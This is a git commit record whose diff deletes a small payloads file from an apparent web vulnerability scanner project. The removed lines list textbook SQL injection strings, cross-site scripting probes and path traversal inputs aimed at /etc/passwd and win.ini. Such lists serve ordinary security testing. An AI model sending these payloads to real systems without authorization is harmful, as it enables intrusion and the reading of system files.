2bf728c003c4d555275ed5efd0d4298bc8bdad29
Victor <ibev34713@gmail.com>
2025-11-26 10:57:59 -0500

    p

--- WVS-Scanner/WVS-Src/payloads.py
+++
@@ -1,3 +0,0 @@
-SQLI_PAYLOADS = ["' OR 1=1--", "' OR 'a'='a"]
-XSS_PAYLOADS = ['<script>alert(1)</script>', '" onmouseover="alert(1)"']
-LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini"]
